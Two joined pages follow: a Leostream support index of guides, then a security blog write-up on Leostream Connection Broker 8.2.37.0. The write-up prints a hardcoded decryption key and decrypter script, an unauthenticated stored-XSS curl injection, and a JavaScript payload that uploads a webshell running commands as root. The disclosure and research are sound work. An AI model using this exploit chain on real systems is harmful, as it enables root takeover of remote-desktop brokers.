=== Content from www.leostream.com_3ae2a62b_20250119_113552.html ===

[Skip to main content](#fw-main-content)

[![Freshworks Logo]()
Leostream Support](/support/home)

* [Home](/support/home)
* [Knowledge base](/support/solutions)
* [Downloads](https://license.leostream.com/download.html "Leostream Downloads")

* [Login](/support/login)
* [Sign up](/support/signup)

1. [Home](/support/home)
2. [Knowledge base](/support/solutions)
3. [Leostream Documentation](/support/solutions/66000285848)
4. [Leostream Platform 202x](/support/solutions/folders/66000424633)
5. ...
   * [Knowledge base](/support/solutions)
   * [Leostream Documentation](/support/solutions/66000285848)
   * [Leostream Platform 202x](/support/solutions/folders/66000424633)
6. Leostream Platform Quick Starts and Guides

All

Articles

Recent Searches
Clear all

No recent searches

 Popular Articles

---

Articles
[View all](/support/search/solutions)

---

Topics
[View all](/support/search/topics)

---

Tickets
[View all](/support/search/tickets)

![no results](/assets/cdn/portal/images/no-results.png)

Sorry! nothing found for

# Leostream Platform Quick Starts and Guides

Modified on Wed, 14 Aug, 2024 at 11:49 AM

**Leostream version 202x**

**TABLE OF CONTENTS**

* [Getting Started with Leostream](#Getting-Started-with-Leostream)
* [Quick Start Guides](#Quick-Start-Guides)
* [Manuals and Administrator Guides](#Manuals-and-Administrator-Guides)
* [Authentication Guides](#Authentication-Guides)
* [Supporting Documentation](#Supporting-Documentation)
* [Performing Upgrades](#Performing-Upgrades)

---

# **Getting Started with Leostream**

 **[General Quick Start Guide](https://docs.leostream.com/v202x/Leostream_quick_start.pdf)**

Step-by-step instructions on the initial configuration of your Leostream Connection Broker.

**[Installation Guide](https://docs.leostream.com/v202x/installation_guide.pdf)**

View the installation guide for the Leostream Connection Broker, Leostream Gateway, Leostream Agent, and Leostream Connect.

**[Introduction to Leostream Concepts](https://docs.leostream.com/v202x/Getting_Started_with_Leostream_Concepts.pdf)**

Read this guide for an introduction to the Leostream components and terminology, and to learn how Leostream manages user sessions.

**[Release Notes](https://docs.leostream.com/v202x/Leostream_202x-release_notes.pdf)**

View the Leostream 202x release notes

---

# **Quick Start Guides**

**[Quick Start Guide for AWS EC2](https://docs.leostream.com/v202x/quick_start_Leostream_with_AWS.pdf)**

Quick Start Guide for Leostream and AWS EC2

[**Quick Start for Amazon WorkSpaces Core**](https://docs.leostream.com/v202x/quick_start_Leostream_with_Amazon_WorkSpaces_Core.pdf)

Quick Start Guide for Leostream and Amazon WorkSpaces Core

**[Quick Start Guide for Azure](https://docs.leostream.com/v202x/quick_start_Leostream_with_Microsoft_Azure_clouds.pdf)**

Quick Start Guide for Leostream and Azure

**[Quick Start using Leostream with HP Anyware Software](https://docs.leostream.com/v202x/quick_start_HP_Anyware_Software.pdf)**

Quick Start Guide using HP Anyware Connection Manager/Security Gateway with Leostream

**[Quick Start using PCoIP with Leostream](https://docs.leostream.com/v202x/quick_start_PCoIP.pdf)**

Quick Start Guide using Leostream to establish direct PCoIP Connections to physical and virtual machine

**[Quick Start Guide with VMware vSphere & Active Directory](https://docs.leostream.com/v202x/Leostream_quick_start.pdf)**

Getting Started with VMware vSphere and Active Directory

**[Quick Start Guide for Scale Computing Platform](https://docs.leostream.com/v202x/quick_start_Leostream_with_Scale_Computing_Platform.pdf)**

Quick Start Guide for Leostream and Scale Computing Platform

**[Quick Start Guide for OpenStack](https://docs.leostream.com/v202x/Leostream_quick_start_OpenStack.pdf)**

Quick Start for Leostream and OpenStack

**[Quick Start Guide for Nutanix AHV](https://docs.leostream.com/v202x/quick_start_Leostream_with_Nutanix_AHV.pdf)**

Quick Start Guide for Leostream and Nutanix AHV

**[Quick Start Guide for Virtuozzo](https://docs.leostream.com/v202x/Leostream_quick_start_Virtuozzo.pdf)**

Quick Start for Leostream and Virtuozzo Hybrid Infrastructure

**[Quick Start using Leostream to Manage HPE Moonshot Systems](https://docs.leostream.com/v202x/quick_start_Leostream_with_HPE_MoonshotSystem.pdf)**

Quick Start Guide for Leostream and HPE Moonshot Systems

**[Quick Start Using Leostream with the VMware Horizon View Direct Connection Plug-In](https://docs.leostream.com/v202x/quick_start_VMware_Direct_Connection_Plugin.pdf)**

Quick Start Guide for Leostream and VMware Horizon View Direct Connection Plug-In

---

# **Manuals and Administrator Guides**

**[Connection Broker Administrator’s Guide](https://docs.leostream.com/v202x/leostream-administrators-guide.pdf)**

The Connection Broker Administrator’s Guide is intended for system administrators who are configuring and administering the Connection Broker via the Administrator Web interface.

**[Leostream Gateway Guide](https://docs.leostream.com/v202x/Leostream_Gateway_guide.pdf)**

The Leostream Gateway provides secure HTML5 remote access for Leostream users. Here is a step-by-step guide on how to get started.

**[Leostream Agent Administrator’s Guide](https://docs.leostream.com/v202x/leostream_agent.pdf)**

The Leostream Agent provides the Connection Broker with insight into the connection status of remote users to their desktops. This document describes configuring and using the Leostream Agent.

**[Leostream Connect Administrator’s Guide](https://docs.leostream.com/v202x/leostream_connect.pdf)**

The Leostream Connect client allows users to log into the Connection Broker and access their resources from laptops, desktops, and Windows tablets. This document describes configuring and using the Leostream Connect client.

**[The Leostream Connection Broker Application Guide](https://docs.leostream.com/v202x/cb_virtual_appliance.pdf)**

This document describes installation requirements, network considerations, console administration, and upgrades for the Leostream Connection Broker application.

**[Leostream Scalability Guide](https://docs.leostream.com/v202x/Leostream_scalability_guide.pdf)**

Read this guide for details on how to build large scale, highly available Connection Broker clusters.

**[Working with Display Protocols](https://docs.leostream.com/v202x/leostream_display_protocols.pdf)**

Leostream can establish a connection to a remote desktop using a variety of supported display protocols. This document provides general guidelines when considering different display protocols and how to support them with Leostream.

---

# **Authentication Guides**

**[Using Entra ID and Azure MFA with Leostream](https://docs.leostream.com/v202x/Using-EntraID-AzureMFA-with-Leostream.pdf)**

This guide describes how to integrate Leostream with Microsoft Entra ID and Azure MFA using a SAML-based Identity provider to impliment enhanced authentication and single sign-on to the Leostream Web client.

**[Using RADIUS Servers for MFA with Leostream](https://docs.leostream.com/v202x/Using-RADIUS-MFA-with-Leostream.pdf)**

This guide describes how to integrate Leostream with MFA providers that support the RADIUS protocol to provide enhanced authentication and single sign-on to the Leostream Web client, Leostream Connect, and PCoIP clients.

**[Using SAML-Based Identity Providers with Leostream](https://docs.leostream.com/v202x/Using-SAML-Identity-Providers-with-Leostream.pdf)**

This guide describes how to integrate Leostream with SAML-based Identity Providers to provide enhanced authentication and single sign-on to the Leostream Web client.

**[Duo MFA for Leostream Logins](https://docs.leostream.com/v202x/Using-Duo-MFA-with-Leostream.pdf)**

This guide describes how to configure Duo and Leostream to protect Leostream logins.

---

# **Supporting Documentation**

**[Glossary of Terms](https://docs.leostream.com/v202x/cb_glossary.pdf)**

The glossary provides an explanation of commonly referred to terms and topics related to the Leostream Connection Broker and Leostream Gateway.

**[Sign-In Page Customization Guide](https://docs.leostream.com/v202x/Customizing-the-Leostream-202x-Signin-Page.pdf)**

This document provides a step-by-step example of how to customize the Leostream 202x Sign In Web page.

Performing Upgrades

**[Security Review Guide](https://docs.leostream.com/v202x/cb_security.pdf)**

This document describes the different pieces of the Connection Broker that are relevant to a security audit, including network level access application level access and maintenance.

**[Setting up Connection Broker DNS SRV Records](https://docs.leostream.com/v202x/dns_setup.pdf)**

Service Location records enable Leostream Connect and the Leostream Agent to automatically discover the address of the Connection Broker by querying the DNS server. See the Leostream DNS Setup Guide for information on setting up DNS.

---

# **Performing Upgrades**

**[Upgrading a Clustered Connection Broker 9.x Environment to Version 202x](https://docs.leostream.com/v202x/upgrading_Connection_broker_9-clusters_to_Leostream_202x.pdf)**

This document describes how to upgrade a clustered Connection Broker 9.x Environment to version 2022, as part of a migration to Leostream Platform 2022.

**[Upgrading a Standalone Connection Broker 9.x to Version 202x](https://docs.leostream.com/v202x/upgrading_Connection_broker_9-to_Leostream_202x.pdf)**

This document describes how to upgrade a standalone Connection Broker 9.x to version 2022. as part of a migration to Leostream Platform version 2022.

---

© Copyright 2023 Leostream Corporation

Print

## Articles in this folder -

* [Leostream Platform Quick Starts and Guides](/support/solutions/articles/66000513448-leostream-platform-quick-starts-and-guides)
* [Leostream Install Errors](/support/solutions/articles/66000522083-leostream-install-errors)

## You may like to read -

* [Leostream Upgrade and Update Policy](/support/solutions/articles/66000516395-leostream-upgrade-and-update-policy)
* [Joining Desktops to a Domain](/support/solutions/articles/66000449870-joining-desktops-to-a-domain)
* [Network Ports Used in a Leostream Environment](/support/solutions/articles/66000460684-network-ports-used-in-a-leostream-environment)
* [Leostream Product Life Cycle](/support/solutions/articles/66000514243-leostream-product-life-cycle)

**X**

![Preview]()

0 of 0

Helpdesk Software by
[Freshdesk](https://www.freshworks.com/freshdesk/?utm_source=portal&utm_medium=reflink&utm_campaign=portal_reflink)
Cookie policy
### Why we love Cookies

We use cookies to try and give you a better experience in Freshdesk.

You can learn more about what kind of cookies we use, why, and how from our [Privacy policy](https://www.freshworks.com/privacy/). If you hate cookies, or are just on a diet, you can disable them altogether too. Just note that the Freshdesk service is pretty big on some cookies (we love the choco-chip ones), and some portions of Freshdesk may not work properly if you disable cookies.

We’ll also assume you agree to the way we use cookies and are ok with it as described in our [Privacy policy](https://www.freshworks.com/privacy/), unless you choose to disable them altogether through your browser.

![Article views count](/support/solutions/articles/66000513448-leostream-platform-quick-starts-and-guides/hit)

=== Content from adepts.of0x.cc_195d0158_20250119_113551.html ===
            LIGHT            DARK  [home](/)[archive](/archive/)[about](/about/) [RSS](/feed.xml)            [VULNERABILITIES](/tags/#vulnerabilities), [RESEARCH](/tags/#research), [X-C3LL](/tags/#x-c3ll)
# A brief encounter with Leostream Connect Broker

  Oct 04, 2020   Adepts of 0xCC   Oct 04, 2020  Adepts of 0xCC

Dear Fell**owl**ship, today’s homily is about a journey that begins with a few perl files encrypted by an ancient alchemy called **source filter**, and ends with a shell as root. Please, take a seat and listen to the story.

Dear Fell**owl**ship, today’s homily is about a journey that begins with a few perl files encrypted by an ancient alchemy called **source filter**, and ends with a shell as root. Please, take a seat and listen to the story.

# Prayers at the foot of the Altar a.k.a. disclaimer

*We reported the vulnerability to Leostream, but the tickets opened within their support platform were refused because we did not provide a customer license. We attempted to contact them again by email and twitter as well with no luck. In this post we talk about version 8.2.37.0, this vulnerability may or may not be present in more recent versions. After all our attempts, and being the support for 8.2 branch ended this September the 30th, we wrote this brief article.*

# Introduction

Leostream is a platform used to manage the connections from users to VDI, cloud desktop, and similar stuff. It supports connections through SSH, VNC, Mechdyne TGX, etc. The platform is composed by 3 elements:

* Leostream Gateway
* Leostream Connection Broker
* Client Connector

 ![Leostream architecture](/Leostream-xss-to-rce/LeostreamArchitecture-01-768x328.png)

 Leostream Architecture

The Gateway component is usually internet-facing and it is in charge of managing the firewall rules to forward the traffic to the Connection Broker, so it is not a “mandatory” element. In practice, only the Connection Broker and the client are required to manage the configured VDIs. Connection Broker can be also integrated with Active Directory, Radius, VPNs, etc; so pwn one and jackpot! Leostream provides an old Connection Broker version as [VM flavour](https://www.leostream.com/resource/legacy-downloads/), so we can download it and ter it to pieces to check its guts.

The VM comes with default user leo (and same password) so we can easily interact with the filesystem through SSH/SCP. The first thing that caught our attention was… Perl. The entire platform is build on top of Perl scripts. Great, so we can just `cat` and `grep` to find common vulnerability patterns within the scripts… except that we can’t. The files are encrypted. **WTF?**

# Diving in Perl forums

The platform is composed by perl scripts (.pl) and perl modules (.pm), being the first just the entry points and the last where the code really lies. The problem is that the perl modules are encrypted, so what you see is:

```
use Filter::Crypto::Decrypt;
b417e4be12f3cf2087102a195e8157cbc849a01c1c02b5e2aa53cbc5f787279661222b414e6cd792764042f3975023511
648fd661af27c1754a739e4fbc68a9fd51236cd6cf7b1f28736fa629adeb67b0eec691cb8167b00458fba5ff0a7af95e5
ee071bfccb6c2a1b80c1861db313cd3af37135d3dc385b2c03979e13818536b48d28be12eb1dc93df1a3df5edec2efda8
7a42d094544f751d57848731253e5cef981(..)

```

So we took our whip and hat from that Indiana Jones halloween costume and started to do a bit of archaeological google-fu, finding that encrypted sources in the perl world was a “common” practice in the old days. This encryption is made via [“source filters”](https://perldoc.perl.org/perlfilter.html), which are programs that can be executed between the file is read and it reaches the perl parser. The original encrypted file is read and saved in memory, then the source filters are called and the code is transformed (in our case decrypted) and finally arrives to the parser where it follows the normal flow as any other script.

This “encryption” is futile as we have access to the files and to the whole VM with root privileges, so we can peek directly the memory to check what is going on. The web platform works on an Apache (httpd) with mod\_perl, so the process must load at some point a shared object with the logic to decrypt the perl modules.

```
[leo@localhost tpc]$ sudo cat /proc/$(pidof httpd | cut -d" " -f1)/maps | grep -i filter
7fc86274f000-7fc862753000 r-xp 00000000 fd:00 263163                     /opt/lib/perl5/site_perl/5.10.1/auto/Filter/Crypto/Decrypt/Decrypt.so
7fc862753000-7fc862953000 ---p 00004000 fd:00 263163                     /opt/lib/perl5/site_perl/5.10.1/auto/Filter/Crypto/Decrypt/Decrypt.so
7fc862953000-7fc862954000 rw-p 00004000 fd:00 263163                     /opt/lib/perl5/site_perl/5.10.1/auto/Filter/Crypto/Decrypt/Decrypt.so

```

Let’s download and try to figure out how it decrypts the files. Here we are going to explain how old versions of Leostream are encrypted (we are working with 8.2.37.0), but more recent releases use a different approach inside their Decrypt.so. First locate any imported perl function related to parsing:

```
0x00001c20]> ii~parser
78 0x00000000  GLOBAL  NOTYPE PL_parser

```

Then find cross-references:

```
[0x00001c20]> axF PL_parser
Finding references of flags matching 'PL_parser'...
[0x002046c8-0x00204750] sym.FilterCrypto_FilterDecrypt 0x25d6 [DATA] mov rbp, qword [rip + 0x201cab]
sym.FilterCrypto_FilterDecrypt 0x344f [DATA] mov r12, qword [rip + 0x200e32]
sym.FilterCrypto_FilterDecrypt 0x3450 [DATA] mov esp, dword [rip + 0x200e32]

```

Ok, so that `FilterCrypto_FilterDecrypt` is our target function. When disassembled, it shows OpenSSL functions being called:

```
...
0x00002ae7      488d3d121100.  lea rdi, obj.filter_crypto_pswd ; 0x3c00 ; "D\x9d*\u03abD\xc0AU\x99\x98\x02l*\x9aO\x853\x8f\x19|P\xeb\x96\x18\x97\xb5\xb6\xcc\xee\x0f\x1a"
|           0x00002aee      488b542458     mov rdx, qword [local_58h]  ; [0x58:8]=0 ; 'X'
|           0x00002af3      41b920000000   mov r9d, 0x20               ; "@"
|           0x00002af9      41b800080000   mov r8d, 0x800
|           0x00002aff      be20000000     mov esi, 0x20               ; "@"
|           0x00002b04      48890424       mov qword [rsp], rax
|           0x00002b08      e863efffff     call sym.imp.PKCS5_PBKDF2_HMAC_SHA1
...
|           0x00003304      e817e7ffff     call sym.imp.EVP_aes_256_cbc
...

```

At this point we know that the files are encrypted with AES-256 in CBC mode and the key is derived using PBKDF2. Also we can observe that the derivation is done to a hardcoded value with the very descriptive name **filter\_crypto\_paswd**. So we only need to get the IV and the salt to start decrypting files. To grab that info we just uploaded a statically compiled gdbserver and debugged the httpd process. What we observed is: every perl module contains its own IV and salt inside the file:

* 0-7 bytes => salt
* 8-23 bytes => IV
* 24-… => encrypted content

We scripted a simple decrypter:

```
#!/usr/bin/env python

# Leostream source code decrypter by X-C3LL (Juan Manuel Fernandez)

import sys
from Crypto.Cipher import AES
import Crypto.Cipher.AES
from binascii import hexlify, unhexlify
from backports.pbkdf2 import pbkdf2_hmac

def unfilter(salt, IV, encrypted):
    password = unhexlify('449d2aceab44c041559998026c2a9a4f85338f197c50eb961897b5b6ccee0f1a') # Hardcoded password
    derived_key = pbkdf2_hmac("sha1", password, salt, 0x800, 32)
    decipher = AES.new(derived_key,AES.MODE_CBC,IV)
    plaintext = decipher.decrypt(encrypted)
    return plaintext

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("python leostream-decrypter.py [SOURCE FILE]")
        exit(-1)
    try:
        with open(sys.argv[1], "r") as file:
            raw = file.read().split("\n")[1]
    except:
        print("[!] Error: file could not be opened!")
        exit(-1)
    decrypted = unfilter(unhexlify(raw[:16]), unhexlify(raw[16:48]), unhexlify(raw[48:]))
    print(decrypted)

```

And now we can start reading source files **:)**:

```
ᐓ    for a in *.pm; do python ../leostream-decrypter.py $a > $a.clean; mv $a.clean $a;done
ᐓ    head -n 6 Index.pm
package Index;
use strict;
use AuthCAS;
use CGI::Cookie;
use Crypt::CBC;
use Crypt::Blowfish;
close failed in file object destructor:
sys.excepthook is missing
lost sys.stderr

```
# Finding a stored XSS :(

With the source code decrypted, understanding how it works internally becomes an easy task. After reading a few files we can observe a common pattern: some (user controlled) data is saved to the database just escaping single quotes to avoid SQL injections, and then this content is showed at other point of the web platform in raw. For example, in WebQuery.pm:

```
sub login {
    my $self = shift;
    my $cg = Session->cg;
    my $fl = Session->fl;
    my $tm = Session->tm;

    $fl->set_tmp('using_browser', 1); # Pretend we are a browser
    $fl->set_tmp('switched_view', 1); # and pretend we switched to administrator view

    my $h = libMisc::browser_client();
    $h->{name} = 'Web Query';
    $h->{client_type} = 'web query';
    $h->{device} = 'application';
    my $client_id = Client->find_client($h);
    if ($client_id) {
        # These fields have defaults which shouldn't be overwritten in existing clients
        delete $h->{client_assignment_mode};
        delete $h->{display_layout_assignment_mode};
        Client->new(-id=>$client_id)->save_data($h);
    } else {
        my $client = Client->new(-new=>1);
        $client->save_data($h);
        $client_id = $client->id;
    }
...

```

In this code snippet we can see how the application calls `libMisc::browser_client()`, sets some fields, and then searches the “client”. If it is new, then the data is saved to the database. Let’s check `browser_client()` from `libMisc.pm`:

```
# Return a Client-formatted recordset about the current browser
sub browser_client {
    my $cg = Session->cg;
    my $ua = $cg->user_agent();
    my $make = parse_user_agent($ua);
    my $h = Client->new(-new=>1)->data;
    $h->{name} = substr($make, 0, 255);
    $h->{client_type} = 'browser';
    $h->{manufacturer} = ($ua =~ /\b(?:MSIE|Trident|Edge)\b/ ? 'Microsoft' : 'Other');
    $h->{device} = 'Web browser';
    $h->{device_version} = substr($ua, 0, 4095);
    $h->{client_language} = substr($ENV{HTTP_ACCEPT_LANGUAGE}, 0, 100);
    $h->{client_token} = '';
    $h->{display_count} = 0;
    $h->{location} = '';
    $h->{ip} = substr($ENV{REMOTE_ADDR}, 0, 20);
    $h->{http_header} = http_header_string();

    # FIXME: for language, return as pretty string.  For example, parse:
    # for i in /usr/share/i18n/locales/*; do echo $i; perl -ne '(/^language/ || /^territory/) && print' $i; echo ""; done
    return $h;
}

```

It takes a lot of user-controlled fields that, in the end, are going to be saved to the database as we saw before. The strings are not escaped before they are stored in the database, and also they are not escaped when they are rendered in the web, so we have a stored XSS.

But… this information is stored before the login credentials are checked, **so we can inject our payload without authentication :)**

```
curl http://remote-target/webquery.pl\?action\=run\&method\=qselect\&user\=AdeptsOf0xCC\&password\=RKL -H "User-Agent: <script>alert(/pwned/)</script>"

```

As stated before, this same code pattern can be spoted in other files.

# Turning the lousy XSS into an RCE as root :)

The recipe to turn an XSS into an RCE in any web platform is usually the same:

* 4oz plugin uploader
* A few drops of injected JavaScript

But this time our XSS-to-RCE-cupcake has a twist: internal URLs are protected by a digest to avoid anti-tampering, so we can not just upload our webshell directly with a request. Let’s dig a bit into this.

Leostream protects the URLs from tampering adding a parameter, `r`, with a digest value that is generated via `digest_of_url` from `libMisc.pm`:

```
...
my $digest = md5_base64((join '!',
                             grep {/^(mb_|action|r|[^=]*[u_]id)/}
                             split /[;&]/, $url)
                            . $digest_secret);

    # Take only the first 7 url-safe characters.  (In tests with an unchanging r value,
    # this algorithm produced only 2 duplicate keys in 3,000,000 uid/thing_id combinations.)
    $digest =~ s/[^a-zA-Z0-9_.-]//g;
    $digest = substr($digest,0,7);

    return $digest;

```

This digest has a random component that is updated every time, so if you refresh the web the `r` values are changed:

```
clients.pl?uid=cHvoum7HQN64ywj3qTeCSQMM94TxrNTge62gnUXYkKQ;mb_user=remote_authentication;r=J0qimdk1465
clients.pl?uid=cHvoum7HQN64ywj3qTeCSQMM94TxrNTge62gnUXYkKQ;mb_user=remote_authentication;r=DyslJw14661
clients.pl?uid=cHvoum7HQN64ywj3qTeCSQMM94TxrNTge62gnUXYkKQ;mb_user=remote_authentication;r=nnAy09Q7683
...

```

Here are our problems:

* **Problem #1**: we can not predict this value, so we can not just send a POST request to upload our webshell. We need to force the navigation and extract the `r` generated.
* **Poblem #2**: the form used to upload third-party compontents is located inside a subsection. We first need to go to the “section”, and then navigate to the “subsection”, also filling some forms in the way.

Solution: two iframes. Not a charming solution, but it works. Our payload should:

1. Locate the link to the “system” section. We can get it accessing the DOM (`document.getElementsByTagName("a")[4]["href"]`)
2. Open an iframe to this location (iframe “pwn1”)
3. Wait until it is loaded and extract the link to the subsection “Maintance” from its DOM (`window.frames["pwn1"].contentDocument.getElementsByTagName("a")[14]["href"]`)
4. Create a new iframe to this new location (iframe “pwn2”) and wait for it to load
5. Find the form inside this second iframe and auto-submit it setting the value to “Upload third-party content” (`window.frames["pwn2"].contentDocument.forms[0]["todo"].value = "upload_tpc"`)
6. Wait until the iframe is reloaded (because of the submited form)
7. Now finally we are at the “upload file” form (`window.frames["pwn2"].contentDocument.forms[0]["action"]`) and we can read the URL to do the request to upload our webshell (just `fetch()`).

Here is our (crappy) final payload (it just executes a `sudo id`):

```
// PoC for XSS in Leostream by X-C3LL (Juan Manuel Fernandez)
var i = document.createElement("iframe");
var check = 0;
i.setAttribute("src", document.getElementsByTagName("a")[4]["href"]);
i.setAttribute("id", "pwn1");
i.addEventListener("load", function() {
    // Wait to load the iframe and then submit the form to go to the page where we can upload the file

    var f = document.createElement("iframe");
    f.setAttribute("src", window.frames["pwn1"].contentDocument.getElementsByTagName("a")[14]["href"]);
    f.setAttribute("id", "pwn2");
    f.addEventListener("load", function() {
        if (check == 0) {
            window.frames["pwn2"].contentDocument.forms[0]["todo"].value = "upload_tpc"
            window.frames["pwn2"].contentDocument.forms[0].submit()
            check = 1;
        }
        else {
            fetch(window.frames["pwn2"].contentDocument.forms[0]["action"], {
                "credentials": "include",
                "headers": {
                "User-Agent": "Swag Owl",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
                "Content-Type": "multipart/form-data; boundary=---------------------------342766341182433198532876615",
                "Upgrade-Insecure-Requests": "1"
            },
            "referrer": "http://owlland/config.pl?uid=h5wxiUFQp6yF4RfDRw14AmRkMGDdxSoGR0kuU3QP9Q;_multi_part_form=1;mb_config=maintenance;maintenance_act=upload_tpc;r=k3snhvj7694",
            "body": "-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_form_has_changed\"\r\n\r\n0\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"uid\"\r\n\r\n" + window.frames["pwn2"].contentDocument.forms[0]["uid"].value + "\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_FORM_SUBMIT\"\r\n\r\n1\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_RAN\"\r\n\r\n99993948\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_STRIP\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_FORM_POSITION\"\r\n\r\n0\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_DATA_FIELDS\"\r\n\r\nfile_name\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_NUMBER_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_POPUP_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_NETMASK_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_IP_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_IP_FIELDS_NUMERIC\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_GT_ZERO_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_GE_ZERO_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_EMAIL_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_PASSWORD_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_FILE_FIELDS\"\r\n\r\nfile_name\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_REQUIRED_FIELDS\"\r\n\r\nfile_name\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_UNIQUE_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_HIDDEN_FIELDS\"\r\n\r\n\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"_multi_part_form\"\r\n\r\n1\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"file_name\"; filename=\"0xCC.pl\"\r\nContent-Type: text/x-perl-script\r\n\r\nprint `sudo id`;\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"mb_config\"\r\n\r\nmaintenance\r\n-----------------------------342766341182433198532876615\r\nContent-Disposition: form-data; name=\"maintenance_act\"\r\n\r\nupload_tpc\r\n-----------------------------342766341182433198532876615--\r\n",
            "method": "POST",
            "mode": "cors"
            });
        }
    });

    document.body.appendChild(f);

});
document.body.appendChild(i);

```

And finally:

```
ᐓ   curl http://192.168.0.20/tpc/0xCC.pl
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```

**:)**

# EoF

This wasn’t really a holy bug, however discovering it was fun because we had to learn a bit about ancient horrors like source filters. We hope you enjoyed this reading!

Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).

   updated\_at 05-10-2020   [Next Remote Command Execution in Ruckus IoT Controller (CVE-2020-26878 & CVE-2020-26879)](/Ruckus-VRIOT-RCE/)    [rss](/feed.xml) © 2024   [klisé](https://github.com/piharpi/jekyll-klise) theme on [jekyll](https://jekyllrb.com)
